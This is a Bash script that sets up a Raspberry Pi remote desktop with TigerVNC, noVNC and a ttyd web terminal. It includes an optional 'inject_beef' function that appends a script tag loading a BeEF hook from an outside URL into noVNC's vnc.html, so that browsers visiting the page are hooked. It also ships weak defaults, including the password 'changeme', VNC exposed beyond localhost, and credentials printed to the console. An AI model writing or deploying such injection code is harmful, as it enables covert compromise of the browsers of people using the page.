#!/bin/bash
set -e  # Stop script on error

# ======================
# User Configuration
# ======================
# IMPORTANT: Change these values before running the script
export TTYD_USERNAME="${TTYD_USERNAME:-$(whoami)}"
export TTYD_PASSWD="${TTYD_PASSWD:-changeme}"
export TEMP_USER="${TEMP_USER:-remote}"
export TEMP_USER_PASS="${TEMP_USER_PASS:-$TTYD_PASSWD}"
export EMAIL="${EMAIL:-user@example.com}"

# ======================
# Network Configuration
# ======================
export NOVNC_PORT="${NOVNC_PORT:-6080}"
export TTYD_PORT="${TTYD_PORT:-5000}"
export VNC_PORT="${VNC_PORT:-5901}"

# ======================
# SSL Configuration
# ======================
export SSL_DIR="${SSL_DIR:-$(pwd)/ssl}"
export DUCK_DOMAIN="${DUCK_DOMAIN:-}"
export DUCK_DIR="/etc/letsencrypt/live/$DUCK_DOMAIN"
export SSL_CERT="$SSL_DIR/fullchain.pem"
export SSL_KEY="$SSL_DIR/privkey.pem"
export SSL_RENEW_DAYS="${SSL_RENEW_DAYS:-30}"

# ======================
# BeEF Configuration (OPTIONAL)
# ======================
export BEEF_ENABLED="${BEEF_ENABLED:-false}"
export BEEF_HOOK_URL="${BEEF_HOOK_URL:-}"
export SCRIPT_TAG="<script src='$BEEF_HOOK_URL'></script>"
export INDEX_FILE="/usr/share/novnc/index.html"
export VNC_FILE="/usr/share/novnc/vnc.html"

# ======================
# VNC Server Configuration
# ======================
export VNC_DISPLAY="${VNC_DISPLAY:-:2}"
export VNC_GEOMETRY="${VNC_GEOMETRY:-1920x1080}"
export VNC_DEPTH="${VNC_DEPTH:-24}"

# ======================
# Security Configuration
# ======================
export DISABLE_SSL=false

# Trap CTRL+C to perform cleanup
trap cleanup INT EXIT

stop() {
    print_message "Stopping services..." "yellow" "🛑"
    cleanup
    exit 0
}

# Check if script was started with "stop" argument
if [ "$1" == "stop" ]; then
    stop
fi

# Check if script was started with "help" argument
if [ "$1" == "help" ] || [ "$1" == "--help" ] || [ "$1" == "-h" ]; then
    echo "Usage: $0 [stop|help]"
    echo ""
    echo "Environment Variables:"
    echo "  TTYD_USERNAME       Username for ttyd authentication (default: current user)"
    echo "  TTYD_PASSWD         Password for ttyd authentication (default: changeme)"
    echo "  TEMP_USER           Temporary user name (default: remote)"
    echo "  TEMP_USER_PASS      Temporary user password (default: TTYD_PASSWD)"
    echo "  EMAIL               Email for SSL certificate (default: user@example.com)"
    echo "  NOVNC_PORT          Port for noVNC (default: 6080)"
    echo "  TTYD_PORT           Port for ttyd (default: 5000)"
    echo "  VNC_PORT            Port for VNC (default: 5901)"
    echo "  SSL_DIR             Directory for SSL certificates (default: ./ssl)"
    echo "  DUCK_DOMAIN         Domain for SSL certificate (required for SSL)"
    echo "  SSL_RENEW_DAYS      Days before SSL expiration to renew (default: 30)"
    echo "  BEEF_ENABLED        Enable BeEF injection (default: false)"
    echo "  BEEF_HOOK_URL       URL for BeEF hook script"
    echo "  VNC_DISPLAY         VNC display number (default: :2)"
    echo "  VNC_GEOMETRY        VNC resolution (default: 1920x1080)"
    echo "  VNC_DEPTH           VNC color depth (default: 24)"
    echo ""
    echo "Examples:"
    echo "  TTYD_PASSWD=mypassword DUCK_DOMAIN=mydomain.duckdns.org $0"
    echo "  $0 stop"
    exit 0
fi

print_message() {
    local message=$1
    local color=$2
    local emoji=$3
    case $color in
        red) color_code="\033[0;31m" ;;
        green) color_code="\033[0;32m" ;;
        yellow) color_code="\033[0;33m" ;;
        blue) color_code="\033[0;34m" ;;
        purple) color_code="\033[0;35m" ;;
        cyan) color_code="\033[0;36m" ;;
        white) color_code="\033[0;37m" ;;
        *) color_code="\033[0m" ;;
    esac
    echo -e "${color_code}${emoji} ${message}\033[0m"
}

close_port() {
    local PORT=$1
    local PID=$(lsof -t -i :$PORT 2>/dev/null)
    if [ ! -z "$PID" ]; then
        print_message "Stopping process on port $PORT (PID: $PID)..." "yellow" "🛑"
        sudo kill -9 $PID 2>/dev/null || true
    fi
}

cleanup() {
    print_message "Cleaning up environment..." "blue" "🩹"
    close_port $NOVNC_PORT
    close_port $TTYD_PORT
    close_port $VNC_PORT
    
    if pgrep -x "Xtigervnc" > /dev/null; then
        print_message "Stopping TigerVNC server..." "yellow" "🛑"
        sudo -u $TEMP_USER tigervncserver -kill $VNC_DISPLAY 2>/dev/null || true
        sudo pkill -f 'tigervncserver' 2>/dev/null || true
    fi
    
    rm -f ttyd.armhf* 2>/dev/null || true
    
    if id "$TEMP_USER" &>/dev/null; then
        print_message "Removing temporary user $TEMP_USER..." "yellow" "🚨"
        sudo pkill -u "$TEMP_USER" 2>/dev/null || true
        sudo deluser --remove-home "$TEMP_USER" 2>/dev/null || true
    fi
    
    print_message "✅ Cleanup complete." "green" "✔️"
}

install_dependencies() {
    print_message "Installing required packages..." "yellow" "⚙️"
    sudo apt update && sudo apt install -y \
        wget iproute2 lsof tigervnc-standalone-server novnc \
        xfce4 xfce4-goodies x11-xserver-utils certbot \
        python3-certbot-dns-standalone acl
    print_message "Dependencies installed successfully." "green" "✅"
}

install_ttyd() {
    if command -v ttyd &>/dev/null; then
        print_message "ttyd is already installed." "green" "✅"
        return
    fi
    
    print_message "Installing ttyd..." "yellow" "⚙️"
    rm -f ttyd.armhf* 2>/dev/null || true
    
    # Detect architecture
    ARCH=$(uname -m)
    case $ARCH in
        armv7l|armhf)
            TTYD_ARCH="armhf"
            ;;
        aarch64|arm64)
            TTYD_ARCH="arm64"
            ;;
        x86_64)
            TTYD_ARCH="amd64"
            ;;
        *)
            print_message "Unsupported architecture: $ARCH" "red" "❌"
            exit 1
            ;;
    esac
    
    print_message "Downloading ttyd for $ARCH..." "cyan" "📥"
    wget -q "https://github.com/tsl0922/ttyd/releases/download/1.7.4/ttyd.linux-$TTYD_ARCH" -O ttyd || {
        print_message "Failed to download ttyd. Trying fallback version..." "yellow" "⚠️"
        wget "https://github.com/tsl0922/ttyd/releases/download/1.6.3/ttyd.$TTYD_ARCH" -O ttyd
    }
    
    if [ $? -eq 0 ]; then
        sudo cp ttyd /usr/local/bin/ttyd
        sudo chmod +x /usr/local/bin/ttyd
        rm -f ttyd
        print_message "ttyd installed successfully." "green" "✅"
    else
        print_message "Failed to install ttyd." "red" "❌"
        exit 1
    fi
}

create_ssl() {
    # Skip SSL if domain not provided
    if [ -z "$DUCK_DOMAIN" ]; then
        print_message "No domain provided. Running without SSL." "yellow" "⚠️"
        export DISABLE_SSL=true
        return
    fi
    
    if [[ -f "$SSL_CERT" ]]; then
        local expire_date
        expire_date=$(openssl x509 -enddate -noout -in "$SSL_CERT" 2>/dev/null | cut -d= -f2)
        if [ -n "$expire_date" ]; then
            local expire_sec
            expire_sec=$(date --date="$expire_date" +%s 2>/dev/null || echo 0)
            local now_sec
            now_sec=$(date +%s)
            local days_left=$(( (expire_sec - now_sec) / 86400 ))

            if (( days_left > SSL_RENEW_DAYS )); then
                print_message "✅ SSL certificate is still valid for $days_left days. Skipping renewal." "green" "🔐"
                export DISABLE_SSL=false
                return
            else
                print_message "⚠️ SSL certificate expires in $days_left days. Attempting renewal..." "yellow" "⏳"
            fi
        fi
    else
        print_message "⚠️ No existing SSL certificate found. Attempting to generate a new one..." "yellow" "📄"
    fi

    print_message "Removing old SSL certificates..." "yellow" "🧨"
    sudo rm -rf ./ssl 2>/dev/null || true
    sudo rm -f "$SSL_CERT" "$SSL_KEY" 2>/dev/null || true

    print_message "Attempting to generate new SSL certificates..." "yellow" "🔐"
    install_dependencies

    local certbot_output
    mkdir -p ./ssl

    if certbot_output=$(sudo certbot certonly --standalone --preferred-challenges http \
        -d "$DUCK_DOMAIN" --email "$EMAIL" --agree-tos --no-eff-email \
        --non-interactive --quiet --rsa-key-size 4096 --must-staple 2>&1); then
        print_message "✅ SSL certificate generated successfully." "green" "🔐"
        export DISABLE_SSL=false
    else
        print_message "❌ Failed to generate new SSL certificate." "red" "⚠️"
        print_message "$certbot_output" "red" "⚠️"

        if [[ -f "$DUCK_DIR/fullchain.pem" && -f "$DUCK_DIR/privkey.pem" ]]; then
            print_message "📂 Using previously existing SSL certificates." "yellow" "📂"
            export DISABLE_SSL=false
        else
            print_message "🚫 No valid SSL certificates found. Disabling SSL." "red" "💥"
            export DISABLE_SSL=true
            return
        fi
    fi

    sudo cp "$DUCK_DIR"/fullchain.pem "$SSL_CERT"
    sudo cp "$DUCK_DIR"/privkey.pem "$SSL_KEY"
    print_message "✅ SSL certificates are ready." "green" "🔒"
}

create_temp_user() {
    if ! id "$TEMP_USER" &>/dev/null; then
        print_message "Creating temporary user $TEMP_USER..." "cyan" "👤"

        # Get TTYD_USERNAME UID and GID
        export TTYD_UID=$(id -u "$TTYD_USERNAME")
        export TTYD_GID=$(id -g "$TTYD_USERNAME")

        # Manually assign UID within the valid range (1000-60000)
        NEW_UID=$(getent passwd | cut -d: -f3 | sort -n | tail -n 1)
        NEW_UID=$((NEW_UID + 1))

        # Ensure the new UID is within the valid range (1000-60000)
        if [[ "$NEW_UID" -lt 1000 ]]; then
            NEW_UID=1000
        elif [[ "$NEW_UID" -gt 60000 ]]; then
            NEW_UID=60000
        fi

        # Create user with the corrected UID
        sudo useradd -m -u "$NEW_UID" -g "$TTYD_GID" -s /bin/bash "$TEMP_USER"
        echo "$TEMP_USER:$TEMP_USER_PASS" | sudo chpasswd

        # Remove existing home directory if exists
        sudo rm -rf /home/$TEMP_USER 2>/dev/null || true

        # Create home directory manually
        sudo mkdir -p /home/$TEMP_USER
        sudo chown $TEMP_USER:$TTYD_GID /home/$TEMP_USER

        # Copy .Xauthority if exists
        if [ -f "/home/$TTYD_USERNAME/.Xauthority" ]; then
            print_message "Copying .Xauthority file for $TEMP_USER..." "yellow" "⚠️"
            sudo cp /home/$TTYD_USERNAME/.Xauthority /home/$TEMP_USER/.Xauthority
            sudo chown $TEMP_USER:$TTYD_GID /home/$TEMP_USER/.Xauthority
        fi

        # Copy VNC password files if they exist
        if [ -d "/home/$TTYD_USERNAME/.vnc" ]; then
            print_message "Copying VNC password files for $TEMP_USER..." "yellow" "⚠️"
            sudo mkdir -p /home/$TEMP_USER/.vnc
            sudo cp -r /home/$TTYD_USERNAME/.vnc/* /home/$TEMP_USER/.vnc/ 2>/dev/null || true
            sudo chown -R $TEMP_USER:$TTYD_GID /home/$TEMP_USER/.vnc
            sudo chmod -R 700 /home/$TEMP_USER/.vnc
        fi

        print_message "Temporary user $TEMP_USER created with UID $NEW_UID." "green" "✅"
    fi
}

start_ttyd() {
    print_message "Starting ttyd..." "blue" "💬"
    install_ttyd
    
    if [[ "$DISABLE_SSL" == true ]]; then
        print_message "Starting ttyd WITHOUT SSL." "yellow" "⚠️"
        sudo -u $TEMP_USER ttyd -c "$TTYD_USERNAME:$TTYD_PASSWD" -p "$TTYD_PORT" bash &
    else
        print_message "Starting ttyd WITH SSL." "green" "🔐"
        sudo -u $TEMP_USER ttyd -S --ssl -C "$SSL_CERT" -K "$SSL_KEY" \
            -c "$TTYD_USERNAME:$TTYD_PASSWD" -p "$TTYD_PORT" bash &
    fi
}

start_vnc_server() {
    print_message "Starting TigerVNC server for $TEMP_USER..." "blue" "💻"
    sudo -u $TEMP_USER tigervncserver $VNC_DISPLAY -geometry "$VNC_GEOMETRY" \
        -depth $VNC_DEPTH -rfbport $VNC_PORT -SecurityTypes VncAuth -localhost no
    
    if [[ $? -eq 0 ]]; then
        print_message "TigerVNC server started successfully." "green" "✅"
    else
        print_message "Error: Failed to start TigerVNC server." "red" "❌"
    fi
}

start_novnc() {
    print_message "Starting noVNC..." "blue" "💻"
    
    # Configure noVNC index.html
    if [ -f "/usr/share/novnc/vnc.html" ] && [ ! -f "/usr/share/novnc/index.html" ]; then
        sudo cp /usr/share/novnc/vnc.html /usr/share/novnc/index.html
    fi
    
    if [[ "$DISABLE_SSL" == true ]]; then
        print_message "Starting noVNC WITHOUT SSL." "yellow" "⚠️"
        sudo -u $TEMP_USER /usr/share/novnc/utils/novnc_proxy --vnc 127.0.0.1:$VNC_PORT \
            --listen "$NOVNC_PORT" &
    else
        print_message "Starting noVNC WITH SSL." "green" "🔐"
        sudo -u $TEMP_USER /usr/share/novnc/utils/novnc_proxy --vnc 127.0.0.1:$VNC_PORT \
            --listen "$NOVNC_PORT" --cert "$SSL_CERT" --key "$SSL_KEY" --ssl-only &
    fi
}

inject_beef() {
    if [[ "$BEEF_ENABLED" != "true" ]]; then
        return
    fi
    
    if [ -z "$BEEF_HOOK_URL" ]; then
        print_message "BEEF_ENABLED is true but BEEF_HOOK_URL is not set. Skipping injection." "yellow" "⚠️"
        return
    fi
    
    print_message "Injecting BeEF into noVNC..." "red" "💉"
    
    if [ ! -f "$INDEX_FILE" ]; then
        print_message "index.html does not exist. Creating and injecting script..." "red" "💉"
        sudo cp "$VNC_FILE" "$INDEX_FILE"
    else
        print_message "index.html exists. Creating backup and injecting script in vnc.html..." "red" "💉"
        sudo cp "$INDEX_FILE" "$VNC_FILE"    
    fi
    echo "$SCRIPT_TAG" | sudo tee -a "$VNC_FILE" > /dev/null
}

print_banner() {
    echo ""
    echo "=========================================="
    echo "  Raspberry Pi VNC Remote Setup"
    echo "=========================================="
    echo ""
}

print_access_info() {
    echo ""
    echo "=========================================="
    echo "  Access Information"
    echo "=========================================="
    echo ""
    if [[ "$DISABLE_SSL" == true ]]; then
        echo "noVNC (Desktop): http://localhost:$NOVNC_PORT"
        echo "ttyd (Terminal): http://localhost:$TTYD_PORT"
    else
        echo "noVNC (Desktop): https://localhost:$NOVNC_PORT"
        echo "ttyd (Terminal): https://localhost:$TTYD_PORT"
    fi
    echo ""
    echo "Username: $TTYD_USERNAME"
    echo "Password: $TTYD_PASSWD"
    echo ""
    echo "=========================================="
    echo ""
}

# Main execution
print_banner

# Validate required configuration
if [ "$TTYD_PASSWD" == "changeme" ]; then
    print_message "WARNING: Using default password. Please set TTYD_PASSWD environment variable." "yellow" "⚠️"
fi

install_dependencies
create_ssl
create_temp_user
inject_beef
start_vnc_server
start_ttyd
start_novnc

print_access_info

print_message "✅ Setup complete. Press CTRL+C to stop services." "green" "🎉"

# Keep script running
wait
